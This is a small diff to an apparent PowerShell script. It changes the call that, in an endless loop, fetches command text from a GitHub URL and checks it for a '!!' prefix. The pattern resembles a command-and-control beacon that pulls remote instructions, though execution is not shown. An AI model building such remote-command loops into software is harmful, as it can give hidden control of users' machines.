@@ -8,7 +8,7 @@ while ($true) {
         $command = $null
     
         # Fetch the raw content of the GitHub page (plain text) for every iteration
-        $command = Invoke-RestMethod -Uri $githubUrl
+        $command = Invoke-WebRequest -Uri $githubUrl
 
         # Check if the command starts with '!!' and strip that part off
         if ($command -like "!!*") {
